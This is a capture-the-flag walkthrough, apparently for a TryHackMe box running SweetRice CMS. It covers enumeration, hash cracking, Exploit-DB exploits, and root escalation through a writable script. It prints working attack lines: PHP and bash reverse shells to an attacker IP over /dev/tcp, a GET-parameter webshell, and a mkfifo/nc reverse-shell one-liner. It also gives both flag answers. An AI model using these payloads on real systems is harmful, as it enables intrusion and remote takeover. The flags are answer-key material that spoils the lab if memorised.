Have some fun! There might be multiple ways to get user access.

# What is the user flag?

Start with an nmap scan
`nmap -sS -Pn -p- -T4 -vv 10.10.186.242`

We can see SSH and HTTP open

Look more in detail into SSH and HTTP
`nmap -sS -Pn -p 22,80 -T4 -vv 10.10.186.242 -sC -sV`
This reveals SSH OpenSSH 7.2p2 Ubuntu2.8 and HTTP Apache 2.4.18

The website appears to be the Apache default landing page.

Run gobuster
`gobuster dir --url 10.10.186.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

This finds a `/content/` path that shows it is running Basic-CMS Sweet Rice.

Looking at the source we can see some JS files referenced.

Run gobuster on the `/content/` directory
`gobuster dir --url 10.10.186.242/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

We see a number of directories
`/images` images for loading, favicon, etc
`/js` contains the javascript mentioned earlier
`/inc` contains a number of PHP files, and a mysql backup
`/as` is a logon page
`/_themes` is a default theme
`/attachment` is empty

Looking at the source of the logon page, we see the following:
```
	var query = new Object();
	query.user = escape(user);
	query.passwd = passwd;
	query.rememberMe = rememberMe;
	_.ajax({
		'type':'POST',
		'data':query,
		'url':'./?type=signin',
		'success':function(result){
				if (typeof(result) == 'object'){
					_('#signTip').html(result['statusInfo']);
					if (result['status']==1){
						location.href = _('#returnUrl').val()?_('#returnUrl').val():'./';
					}
				}
		}
	});
```

The request is a POST request to ?type=signin

Trying the url `/content/as/?type=signin` we get a JSON response
```
status	0
statusInfo	"Login failed"
```


I couldn't work out how to use that, however looking at the MYSQL backup in /content/inc/ we can see a password revealed.  It looks to be an MD5 hash.

`hashcat -a 0 -m 0 hash.txt rockyou.txt` gave the password as `Password123`
The username is `manager` (also found the in SQL backup).  This lets us into the web interface, but not SSH.

Based on the information on the `/content/` page we need to set the site to running.  Lets do that by clicking `Running`

Navigating to `/content/` we see it is now active.

Looking for further details, i found https://www.exploit-db.com/exploits/40700.  Perhaps we can use this to get a remote shell.  I modified the code to be 
`<form action="http://10.10.156.105/content/as/?type=ad&mode=save" method="POST" name="exploit">` for my target IP and the directory structure.
I ran the exploit then looked at the `/inc` page.  The Ads folder was created, but nothing in it.  I ran it again, and the `hacked.php` file appeared.

I modified the file to be
```html
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.156.105/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="shell"/>
<textarea type="hidden" name="adv">
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.4.18.254"/8081 0>&1'");?>
&lt;/textarea&gt;
</form>
</body>
</html>
```
The IP is my attackbox IP, port 8081.  I also changed the file name from `hacked.php` to `shell.php`
However when I ran this code, a reverse shell didn't appear, and the uploaded .php file didn't have the expected code.

Found a different exploit https://www.exploit-db.com/exploits/40716 for arbitrary file upload.

Saved the `.py` file, and then created a `shell.php` file containing
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.4.18.254"/8081 0>&1'");
?>
```

Execute the Python code, with URL of `10.10.156.105/content`, username `manager`, password `Password123` and we see it is a successful upload.

When we navigate to `/content/attachments` the file isn't there.
I attempted to upload a file directly through the Media Center (`/content/as/?type=media_center`) options which says it was successful, but it didn't appear.

I renamed the `shell.php` to `shell.php5` and attempted an upload using the exploit and it was successfully uploaded and visible in `/content/attachments`

There is some file format filtering in place.  Unfortunately the file contents are empty.
Attempted crazy case file extensions, null terminated, no change.

I created a webshell using the exploit earlier (https://www.exploit-db.com/exploits/40700) by adding `<?php echo system($_GET['command']); ?>` and was able to run commands via `/content/inc/ads/hacked.php?command=whoami`

we are running as `www-data` from `/var/www/html/content/inc/ads`
`/content/inc/ads/hacked.php?command=ls%20/home` shows we are running as `itguy`

`/content/inc/ads/hacked.php?command=cat%20/home/itguy/user.txt`
Answer: `THM{63e5bce9271952aad1113b6f1ac28a07}`

# What is the root flag?

`/content/inc/ads/hacked.php?command=cat%20/home/itguy/mysql_login.txt`
`rice:randompass`

`/content/inc/ads/hacked.php?command=cat%20/home/itguy/backup.pl`
`#!/usr/bin/perl system("sh", "/etc/copy.sh"); system("sh", "/etc/copy.sh");`

`/content/inc/ads/hacked.php?command=cat%20/etc/copy.sh`
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`

``/content/inc/ads/hacked.php?command=sudo%20-l`
`Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`


Looking at the web interface, you can paste custom code into the ads section.  I used https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php and saved it as revshell
Navigating to `/content/?action=ads&adname=revshell` spawned a reverse shell.

looking at `/etc/copy.sh` it is indeed writable, nano doesn't work, vim is not installed, even vi is not installed.
From `/etc/`
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.18.254 5554 >/tmp/f" > copy.sh`

Back to `/home/itguy/` and run
`sudo /usr/bin/perl /home/itguy/backup.pl` and we get a reverse shell on 5554


`cat /root/root.txt`
Answer: `THM{6637f41d0177b6f37cb20d775124699f}`